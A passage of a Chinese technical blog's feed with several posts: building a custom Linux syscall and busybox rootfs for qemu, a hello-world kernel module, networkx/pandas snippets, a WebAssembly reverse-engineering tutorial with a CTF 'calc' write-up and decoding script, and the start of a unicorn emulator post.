<p><a href="https://blog.csdn.net/panhewu9919/article/details/99438304">asmlinkage</a>是一个宏，这里使用asmlinkage是因为syscall handler是汇编代码，而syscall routine是C代码，在使用syscall的时候是通过堆栈传递参数的，而asmlinkage的作用就是限定函数从堆栈中获取参数。</p>
<h2 id="3-4-编写函数代码"><a href="#3-4-编写函数代码" class="headerlink" title="3.4. 编写函数代码"></a>3.4. 编写函数代码</h2><p>在./kernel/sys.c中添加代码:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">SYSCALL_DEFINE0</span><span class="token punctuation">(</span>hello<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Hello,my syscall.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="3-5-重新编译"><a href="#3-5-重新编译" class="headerlink" title="3.5. 重新编译"></a>3.5. 重新编译</h2><pre class="line-numbers language-none"><code class="language-none">make -j2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="4-安装busybox"><a href="#4-安装busybox" class="headerlink" title="4. 安装busybox"></a>4. 安装busybox</h1><h2 id="4-1-下载"><a href="#4-1-下载" class="headerlink" title="4.1. 下载"></a>4.1. 下载</h2><pre class="line-numbers language-none"><code class="language-none">wget https://busybox.net/downloads/busybox-1.33.1.tar.bz2 \
&amp;&amp; tar -xjf busybox-1.33.1.tar.bz2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="4-2-编译"><a href="#4-2-编译" class="headerlink" title="4.2. 编译"></a>4.2. 编译</h2><pre class="line-numbers language-none"><code class="language-none">make menuconfig   //Build Options，一定要选择Build static binary (no shared libs)，切记！！！
make
make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="4-3-配置"><a href="#4-3-配置" class="headerlink" title="4.3. 配置"></a>4.3. 配置</h2><pre class="line-numbers language-none"><code class="language-none">cd _install 
mkdir -pv {bin,sbin,etc,proc,sys,usr/{bin,sbin}}

# etc目录下创建inittab文件，文件内容如下：
::sysinit:/etc/init.d/rcS   #指定初始化脚本
::askfirst:-/bin/ash
::ctrlaltdel:/sbin/reboot
::shutdown:/sbin/swapoff -a
::shutdown:/bin/umount -a -r
::restart:/sbin/init

# etc目录下
mkdir init.d &amp;&amp; cd init.d
touch rcS

# rcS内容
#!/bin/sh
mount -t proc none /proc
mount -t sys none /sys
/bin/mount -n -t sysfs none /sys
/bin/mount -t ramfs none /dev
/sbin/mdev -s    # We need this to find /dev/sda later

chmod +x rcS

# 配置dev目录
mkdir dev
sudo mknod dev/ttyAMA0 c 204 64
sudo mknod dev/null c 1 3
sudo mknod dev/console c 5 1

# 创建文件系统
find . | cpio -o --format=newc &gt; ../rootfs2-1.img

# 运行内核镜像
qemu-system-x86_64 -kernel ./arch/x86/boot/bzImage -initrd ./rootfs2-1.img -append "root=/dev/ram rdinit=/sbin/init"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="5-测试系统调用"><a href="#5-测试系统调用" class="headerlink" title="5. 测试系统调用"></a>5. 测试系统调用</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">// test_sys_hello.c
#define _GNU_SOURCE
#include &lt;unistd.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;stdio.h&gt;
#define __NR_hello 436 //系统调用号

int main() {
    printf("Prepare to call syscall hello.\n");
    syscall(__NR_hello);
    return 0;
}

// 编译,务必静态编译
gcc test_sys_hello.c -o syshello -static  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将生成的elf文件放到文件系统中，然后重新生成文件系统镜像，启动系统，运行。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://ctf-wiki.org/pwn/linux/kernel/basic_knowledge/">ctf-wiki</a></li>
<li><a href="https://github.com/bsauce/kernel-security-learning">https://github.com/bsauce/kernel-security-learning</a></li>
<li><a href="https://d1nn3r.github.io/2018/09/19/kernel-pwn/">https://d1nn3r.github.io/2018/09/19/kernel-pwn/</a></li>
</ol>
]]></content>
      <categories>
        <category>pwn</category>
        <category>kernel-pwn</category>
      </categories>
      <tags>
        <tag>kernel-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>linux驱动模块编写</title>
    <url>/2021/05/12/linux-qu-dong-mo-kuai-bian-xie/</url>
    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h1><blockquote>
<p>Linux系统分为内核态和用户态，只有内核态才有访问硬件设备的权限。驱动实际上是内核态提供给用户态访问硬件设备的API。</p>
</blockquote>
<h1 id="1-demo——以HelloWorld为例"><a href="#1-demo——以HelloWorld为例" class="headerlink" title="1. demo——以HelloWorld为例"></a>1. demo——以HelloWorld为例</h1><h2 id="1-1-驱动模块代码的组成"><a href="#1-1-驱动模块代码的组成" class="headerlink" title="1.1. 驱动模块代码的组成"></a>1.1. 驱动模块代码的组成</h2><ol>
<li>头文件</li>
<li>模块装载函数和卸载函数的<strong>实现</strong></li>
<li>模块装载函数和卸载函数的<strong>声明</strong></li>
<li>其它信息，例如协议、作者等</li>
</ol>
<h2 id="1-2-驱动代码"><a href="#1-2-驱动代码" class="headerlink" title="1.2. 驱动代码"></a>1.2. 驱动代码</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">//hello_drv.c
#include &lt;linux/module.h&gt;
#include &lt;linux/init.h&gt;

// GPL and author
MODULE_LICENSE("GPL");
MODULE_AUTHOR("XXX");

// install module
static int __init hello_drv_init(void)
{
    printk("--------------install hello_drv--------------\n");
    return 0;
}

// uninstall module
// NOTE：uninstall function do not have return value
static void __exit hello_drv_exit(void)
{
    printk("--------------uninstall hello_drv--------------\n");
}

// declaration
module_init(hello_drv_init);
module_exit(hello_drv_exit);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>题外话，复习一下static关键词，面试有被问到，不会......<br>  被static修饰的函数仅在当前文件内可以使用<br>  被static修饰的变量会被默认初始化为0(且程序逆运行过程中只初始化1次)，它的可见范围也仅限于当前文件</p>
</blockquote>
<h2 id="1-3-Makefile"><a href="#1-3-Makefile" class="headerlink" title="1.3. Makefile"></a>1.3. Makefile</h2><pre class="line-numbers language-none"><code class="language-none">CUR_DIR := $(shell pwd)     #驱动代码所在目录
ROOTFS_DIR := ..            #文件系统根目录
KERNEL_DIR := ../../../linux-5.4.5  #内核源码所在目录

ifeq ($(KERNELRELEASE),)

all:
	make -C $(KERNEL_DIR) M=$(CUR_DIR) modules
clean:
	make -C $(KERNEL_DIR) M=$(CUR_DIR) clean
install:
	cp -raf *.ko $(ROOTFS_DIR)/drv_module

else
	obj-m += hello_drv.o

endif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Make过程描述：<br>第一次执行make时，KERNELRELEASE还没有被定义，所以执行<strong>伪目标</strong>all。make -C指定内核所在目录，当执行到这里的时候KERNELRELEASE就被定义了。M=$(CUR_DIR)即在当前目录下编译文件为模块，但是此时不知道编译哪个文件为模块。之后再次执行make，此时因为KERNELRELEASE已经被定义，执行else中的内容，将hello_drv.c编译成hello_drv.o并链接成hello_drv.ko。</p>
<h2 id="1-4-安装"><a href="#1-4-安装" class="headerlink" title="1.4. 安装"></a>1.4. 安装</h2><pre class="line-numbers language-none"><code class="language-none">lsmod:查看当前安装的驱动模块
insmod:安装驱动模块 #在安装自己写的驱动的时候，有可能会报taints kernel的信息。
                #这个不用管，因为我们自己写的模块不在内核的代码树里
rmmod:删除驱动模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/2021/05/12/linux-qu-dong-mo-kuai-bian-xie/%E5%AE%89%E8%A3%85%E9%A9%B1%E5%8A%A8.png" class="">

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://paper.seebug.org/779/">从 0 开始学 Linux 驱动开发(一)</a></li>
<li><a href="https://blog.csdn.net/fenglang1233307/article/details/79677590">简单的linux驱动模块编写</a></li>
</ol>
]]></content>
      <categories>
        <category>linux</category>
        <category>驱动</category>
      </categories>
      <tags>
        <tag>驱动</tag>
      </tags>
  </entry>
  <entry>
    <title>python</title>
    <url>/2021/07/02/python/</url>
    <content><![CDATA[<h1 id="networkx"><a href="#networkx" class="headerlink" title="networkx"></a>networkx</h1><h2 id="边"><a href="#边" class="headerlink" title="边"></a>边</h2><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 建立一条结点A到结点B的边，其对应属性attr1的值为val1，对应属性attr2的值为val2</span>
G<span class="token punctuation">.</span>add_edges_from<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"attr1"</span><span class="token punctuation">:</span>val1<span class="token punctuation">,</span><span class="token string">"attr2"</span><span class="token punctuation">:</span>val2<span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># 获取属性值</span>
G<span class="token punctuation">[</span><span class="token string">"A"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"B"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"attr1"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="边是否存在"><a href="#边是否存在" class="headerlink" title="边是否存在"></a>边是否存在</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">G<span class="token punctuation">.</span>has_edge<span class="token punctuation">(</span>node1<span class="token punctuation">,</span>node2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<h1 id="pandas"><a href="#pandas" class="headerlink" title="pandas"></a>pandas</h1><h2 id="创建DataFrame"><a href="#创建DataFrame" class="headerlink" title="创建DataFrame"></a>创建DataFrame</h2><ul>
<li>columns为列名，按行赋值   <img src="/2021/07/02/python/pandas%E5%88%9B%E5%BB%BADataFrame(3).png" class=""></li>
</ul>
<h2 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h2><ul>
<li>csv<pre class="line-numbers language-none"><code class="language-none">read_csv(filename)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<h2 id="写入数据"><a href="#写入数据" class="headerlink" title="写入数据"></a>写入数据</h2><ul>
<li>csv  <pre class="line-numbers language-python" data-language="python"><code class="language-python">wine_reviews<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">"wine_reviews.csv"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><ul>
<li>改数值<img src="/2021/07/02/python/pandas_DataFrame%E6%94%B9%E6%95%B0%E5%80%BC.png" class=""></li>
</ul>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>图算法</tag>
      </tags>
  </entry>
  <entry>
    <title>wasm逆向分析方法</title>
    <url>/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/</url>
    <content><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><blockquote>
<p>WebAssembly（缩写为Wasm）是基于堆栈的虚拟机的二进制指令格式。Wasm被设计为可编程C / C ++ / Rust等高级语言的可移植目标，可在Web上部署客户端和服务器应用程序。</p>
</blockquote>
<h1 id="2-WebAssembly文本格式"><a href="#2-WebAssembly文本格式" class="headerlink" title="2. WebAssembly文本格式"></a>2. WebAssembly文本格式</h1><h2 id="2-1-全局变量"><a href="#2-1-全局变量" class="headerlink" title="2.1. 全局变量"></a>2.1. 全局变量</h2><h3 id="2-1-1-global-get"><a href="#2-1-1-global-get" class="headerlink" title="2.1.1. global.get"></a>2.1.1. <code>global.get</code></h3><p>把全局变量的值推入栈顶。</p>
<p>Example:</p>
<pre class="line-numbers language-none"><code class="language-none">global.get $global0

且 global0 = d
则有如下操作：

|     |  ↘|  d  |      
|  a  |    |  a  |   
|  b  |    |  b  |   
|  c  |    |  c  |      
└─────┘    └─────┘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="2-1-2-global-set"><a href="#2-1-2-global-set" class="headerlink" title="2.1.2. global.set"></a>2.1.2. <code>global.set</code></h3><p>从栈顶弹出1个值，并将其设置为全局变量</p>
<p>Example:</p>
<pre class="line-numbers language-none"><code class="language-none">global.set $global0

则有如下操作：
|  d  |↗  |     |      
|  a  |    |  a  |   
|  b  |    |  b  |      
|  c  |    |  c  |      
└─────┘    └─────┘，且global0 = d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="2-2-局部变量"><a href="#2-2-局部变量" class="headerlink" title="2.2. 局部变量"></a>2.2. 局部变量</h2><h3 id="2-2-1-local-get"><a href="#2-2-1-local-get" class="headerlink" title="2.2.1. local.get"></a>2.2.1. <code>local.get</code></h3><p>类似<code>global.get</code>,不同之处是它将局部变量入栈。</p>
<h3 id="2-2-2-local-set"><a href="#2-2-2-local-set" class="headerlink" title="2.2.2. local.set"></a>2.2.2. <code>local.set</code></h3><p>类似<code>global.set</code>,不同之处是它将栈顶值弹出，并赋给1个局部变量。        </p>
<h3 id="2-2-3-local-tee"><a href="#2-2-3-local-tee" class="headerlink" title="2.2.3. local.tee"></a>2.2.3. <code>local.tee</code></h3><p>与<code>local.set</code>类似，但是它不会将栈顶值弹出。</p>
<p>Example:</p>
<pre class="line-numbers language-none"><code class="language-none">local.tee $var0

则有如下操作：
|  d  |↗ ↘|  d  |      
|  a  |    |  a  |   
|  b  |    |  b  |      
|  c  |    |  c  |      
└─────┘    └─────┘，且var0 = d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="2-3-内存操作"><a href="#2-3-内存操作" class="headerlink" title="2.3. 内存操作"></a>2.3. 内存操作</h2><h3 id="2-3-1-load"><a href="#2-3-1-load" class="headerlink" title="2.3.1. load"></a>2.3.1. <code>load</code></h3><p>以栈顶值为地址取数据</p>
<p>Example:</p>
<pre class="line-numbers language-none"><code class="language-none">i64.load offset=88

则有如下操作:
|  d  |↗ ↘|M[d+88]|      
|  a  |    |  a  |   
|  b  |    |  b  |      
|  c  |    |  c  |      
└─────┘    └─────┘
即将d出栈，将内存中d+88指向的1个64位数据入栈<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="2-3-2-store"><a href="#2-3-2-store" class="headerlink" title="2.3.2. store"></a>2.3.2. <code>store</code></h3><p>将栈顶值出栈，存到以下一个栈顶值为地址的内存中，即<code>M[stack[-2]] = stack[-1]</code></p>
<p>Example:</p>
<pre class="line-numbers language-none"><code class="language-none">local.get $var0
local.get $var1
i64.store

| v[1]|↗  |     |      
| v[0]|↗  |     |   
|  b  |    |  b  |      
|  c  |    |  c  |      
└─────┘    └─────┘
且M[v[0]] = v[1];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="2-4-函数调用"><a href="#2-4-函数调用" class="headerlink" title="2.4. 函数调用"></a>2.4. 函数调用</h2><h3 id="2-4-1-call"><a href="#2-4-1-call" class="headerlink" title="2.4.1. call"></a>2.4.1. <code>call</code></h3><p>函数的参数从左至右依次入栈，调用目标由立即数指定，调用结束以后参数全部出栈，返回值入栈(wasm1.0规定返回值至多有1个)</p>
<p>Example:</p>
<pre class="line-numbers language-none"><code class="language-none">call $func6

| p1  |↗  |     |      
| p0  |↗  | ret |   
|  b  |    |  b  |      
|  c  |    |  c  |      
└─────┘    └─────┘
即调用函数func6(p0,p1),返回值为ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="2-5-wat文件格式解析"><a href="#2-5-wat文件格式解析" class="headerlink" title="2.5. .wat文件格式解析"></a>2.5. <code>.wat</code>文件格式解析</h2><h3 id="2-5-1-导入表"><a href="#2-5-1-导入表" class="headerlink" title="2.5.1. 导入表"></a>2.5.1. 导入表</h3><p>Example:</p>
<pre class="line-numbers language-none"><code class="language-none">(import "a" "a" (func (;0;) (type 13)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>即wasm导入了名为a的js模块中的a库函数，在js代码中的表现如下:</p>
<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/importJS.png" class="">  

<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/asmLibraryArg.png" class="">

<p>即wasm中func0实际上就是JS代码中的<code>___assert_fail</code>函数</p>
<h3 id="2-5-2-导出表"><a href="#2-5-2-导出表" class="headerlink" title="2.5.2. 导出表"></a>2.5.2. 导出表</h3><p>Example:</p>
<pre class="line-numbers language-none"><code class="language-none">(export "f" (func 27))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>即wasm将函数func27导出给JS调用，导出的函数名为"f"。</p>
<h3 id="2-5-3-数据段"><a href="#2-5-3-数据段" class="headerlink" title="2.5.3. 数据段"></a>2.5.3. 数据段</h3><p>Example:</p>
<pre class="line-numbers language-none"><code class="language-none">(data (;0;) (i32.const 1024) "0077678b0f3e6cf6e263e6fe3a4c39f3\00length is not valid\00Success\00Oops....something wrong\00n &amp;&amp; \22n is null\22\00bn.c\00bignum_from_int\00bignum_from_string\00str &amp;&amp; \22str is null\22\00nbytes &gt; 0 &amp;&amp; \22nbytes must be positive\22\00(nbytes &amp; 1) == 0 &amp;&amp; \22string format must be in hex -&gt; equal number of bytes\22\00(nbytes % (sizeof(uint32_t) * 2)) == 0 &amp;&amp; \22string length must be a multiple of (sizeof(DTYPE) * 2) characters\22\00%8x\00bignum_to_string\00%.08x\00a &amp;&amp; \22a is null\22\00bignum_add\00b &amp;&amp; \22b is null\22\00c &amp;&amp; \22c is null\22\00bignum_mul\00bignum_cmp\00dst &amp;&amp; \22dst is null\22\00bignum_assign\00src &amp;&amp; \22src is null\22\00-+   0X0x\00(null)\00\00\11\00\0a\00\11\11\11\00\00\00\00\05\00\00\00\00\00\00\09\00\00\00\00\0b\00\00\00\00\00\00\00\00\11\00\0f\0a\11\11\11\03\0a\07\00\01\00\09\0b\0b\00\00\09\06\0b\00\00\0b\00\06\11\00\00\00\11\11\11")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>即程序内存偏移为1024的地方，存放的数据为"0077678b0f3......"</p>
<h1 id="3-静态分析"><a href="#3-静态分析" class="headerlink" title="3. 静态分析"></a>3. 静态分析</h1><h2 id="3-1-反汇编"><a href="#3-1-反汇编" class="headerlink" title="3.1. 反汇编"></a>3.1. 反汇编</h2><h3 id="3-1-1-ida自带WebAssembly插件-本人没用过"><a href="#3-1-1-ida自带WebAssembly插件-本人没用过" class="headerlink" title="3.1.1. ida自带WebAssembly插件(本人没用过)"></a>3.1.1. ida自带WebAssembly插件(本人没用过)</h3><h3 id="3-1-2-使用WABT"><a href="#3-1-2-使用WABT" class="headerlink" title="3.1.2. 使用WABT"></a>3.1.2. 使用<a href="https://github.com/WebAssembly/wabt">WABT</a></h3><pre class="line-numbers language-none"><code class="language-none">./wasm2wat test.wasm -o test.wat    //获取字节码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="3-2-反编译"><a href="#3-2-反编译" class="headerlink" title="3.2. 反编译"></a>3.2. 反编译</h2><h3 id="3-2-1-使用WABT"><a href="#3-2-1-使用WABT" class="headerlink" title="3.2.1. 使用WABT:"></a>3.2.1. 使用WABT:</h3><p><code>./wasm2c test.wasm -o test.c</code>     </p>
<p>得到<code>.c</code>文件和<code>.h</code>文件。<br>这一步得到的代码可读性仍然很差，光是行数也很吓人。</p>
<p>另外还可以使用wasm-decompiler:<br><code>./wasm-decompiler test.wasm</code><br>得到的是伪C代码，效果也不是很好。</p>
<h3 id="3-2-2-优化——gcc重新编译"><a href="#3-2-2-优化——gcc重新编译" class="headerlink" title="3.2.2. 优化——gcc重新编译"></a>3.2.2. 优化——gcc重新编译</h3><p>将wasm2c反编译得到的<code>.c</code>文件和<code>.h</code>文件和WABT中的<code>wasm-rt.h</code>放在一个文件夹下重新编译。</p>
<pre class="line-numbers language-none"><code class="language-none">gcc -c test.c -o test.o<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这一步要注意，链接会出错(因为很多函数没有具体实现)，所以我们只生成目标文件即可。<br>到这里我们就得到了可以用ida分析的elf文件。</p>
<h1 id="4-动态分析"><a href="#4-动态分析" class="headerlink" title="4. 动态分析"></a>4. 动态分析</h1><p>python搭建临时服务器</p>
<pre class="line-numbers language-none"><code class="language-none">python -m http.server &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后双击html文件，按<code>f12</code>，然后按<code>ctrl+r</code>即可开始调试     </p>
<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/wasm%E8%B0%83%E8%AF%95.png" class="" title="调试窗口">   
<p>如图中右侧窗口所示，我们可以使用谷歌自带的wasm调试器设置断点、观察堆栈、局部变量、调用栈等信息。</p>
<h1 id="5-实战"><a href="#5-实战" class="headerlink" title="5. 实战"></a>5. 实战</h1><h2 id="5-1-2021蓝帽杯calc"><a href="#5-1-2021蓝帽杯calc" class="headerlink" title="5.1. 2021蓝帽杯calc"></a>5.1. 2021蓝帽杯calc</h2><h3 id="5-1-1-分析html和js代码"><a href="#5-1-1-分析html和js代码" class="headerlink" title="5.1.1 分析html和js代码"></a>5.1.1 分析html和js代码</h3><img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/%E8%93%9D%E5%B8%BD%E6%9D%AFcalc_html%E9%A1%B5%E9%9D%A2.jpg" class="" title="html页面">    
<p>主要判断逻辑在<code>check_input</code>函数中。 </p>
<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
function check_input(){var e=document.getElementById("input_char").value;console.log(e);Module.ccall("entry","number",["string"],[e])}
&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>该函数读取输入，并将输入作为ccall函数的参数。<br>js代码中ccall的定义如下：</p>
<pre class="line-numbers language-none"><code class="language-none">function ccall(ident, returnType, argTypes, args, opts) {
    var toC = {
        "string": function(str) {
            var ret = 0;
            if (str !== null &amp;&amp; str !== undefined &amp;&amp; str !== 0) {
                var len = (str.length &lt;&lt; 2) + 1;
                ret = stackAlloc(len);
                stringToUTF8(str, ret, len)
            }
            return ret
        },
        "array": function(arr) {
            var ret = stackAlloc(arr.length);
            writeArrayToMemory(arr, ret);
            return ret
        }
    };
    function convertReturnValue(ret) {
        if (returnType === "string") return UTF8ToString(ret);
        if (returnType === "boolean") return Boolean(ret);
        return ret
    }
    var func = getCFunc(ident);
    var cArgs = [];
    var stack = 0;
    if (args) {
        for (var i = 0; i &lt; args.length; i++) {
            var converter = toC[argTypes[i]];
            if (converter) {
                if (stack === 0) stack = stackSave();
                cArgs[i] = converter(args[i])
            } else {
                cArgs[i] = args[i]
            }
        }
    }
    var ret = func.apply(null, cArgs);
    ret = convertReturnValue(ret);
    if (stack !== 0) stackRestore(stack);
    return ret
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>该函数首先调用getCFunc("entry"),getCFunc定义如下：  </p>
<pre class="line-numbers language-none"><code class="language-none">function getCFunc(ident) {
    var func = Module["_" + ident];
    assert(func, "Cannot call unknown function " + ident + ", make sure it is exported");
    return func
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其中Module["_entry"]如下：</p>
<pre class="line-numbers language-none"><code class="language-none">var _entry = Module["_entry"] = function() {
    return (_entry = Module["_entry"] = Module["asm"]["h"]).apply(null, arguments)
};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这里的<code>Module["asm"]["h"]</code>其实是调用了<code>.wasm</code>中的导出函数，如下：</p>
<pre class="line-numbers language-none"><code class="language-none">(export "f" (func 27))
(export "g" (func 86))
(export "h" (func 75))
(export "i" (table 0))
(export "j" (func 48))
(export "k" (func 47))
(export "l" (func 46))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>即函数<code>check_input</code>中的<code>func</code>实际上指向<code>.wasm</code>文件中的func75(同时也是IDA中的<code>_w2c_h</code>函数，如下)</p>
<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/w2c_h.png" class="" title="w2c_h函数">

<p>接下来就是将我们的输入存放到内存中，然后去调用func75。</p>
<p>根据动态调试结果，func28返回输入的长度。</p>
<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/%E9%95%BF%E5%BA%A6%E9%AA%8C%E8%AF%81.png" class="">    

<p>func45验证输入正确与否(一堆跳转，一看就是字符串比对,目标字符串为数据段中的"0077678b0f3e6cf6e263e6fe3a4c39f3")。</p>
<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/func45.png" class="">

<p>函数返回非0则调用f29(1085),否则调用f29(1077)。其中1077指向的数据为"sucess",f29为输出函数，它调用了函数$a.b.<br>那么前面的func28之后一定还有对输入进行加密的逻辑。调试中发现，加密后的输出被存放的内存偏移为func75中早就定义好的全局变量<code>w2c_g0</code>。</p>
<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/func81.png" class="">  
<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/moutput.png" class="">  

<p>更改几次输入很容易发现规律,例如:我们的输入为"123",则输出为:</p>
<p>$$((128*ord('1'))+ord('2'))*128+ord('3')$$</p>
<p>解密脚本:</p>
<pre class="line-numbers language-none"><code class="language-none">bigNum = int("0077678b0f3e6cf6e263e6fe3a4c39f3",16)
res = []
while bigNum != 0:
    res.append(bigNum%128)
    bigNum = bigNum &gt;&gt; 7
print(''.join([chr(i) for i in res[::-1]]))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="6-参考文章"><a href="#6-参考文章" class="headerlink" title="6. 参考文章"></a>6. 参考文章</h1><ol>
<li><a href="https://xz.aliyun.com/t/5170">一种Wasm逆向静态分析方法</a></li>
<li><a href="https://juejin.cn/post/6844904077411745800#heading-4">Wasm介绍之4：函数调用</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/WebAssembly/Understanding_the_text_format">理解WebAssembly文本格式</a></li>
</ol>
<h1 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h1><a href="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/calc.7z" title="calc.7z">calc.7z</a>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>wasm</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>unicorn</title>
    <url>/2021/06/16/unicorn/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>unicorn是一款基于qemu编写的逆向工程引擎，它可以模拟执行不同架构的二进制代码</p>
</blockquote>
<h1 id="安装方式"><a href="#安装方式" class="headerlink" title="安装方式"></a>安装方式</h1><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><h3 id="快速安装"><a href="#快速安装" class="headerlink" title="快速安装"></a>快速安装</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">pip install unicorn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="C"><a href="#C" class="headerlink" title="C"></a>C</h2><blockquote>
<p>源码编译</p>
</blockquote>
<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><blockquote>
<p>以python为例</p>
</blockquote>
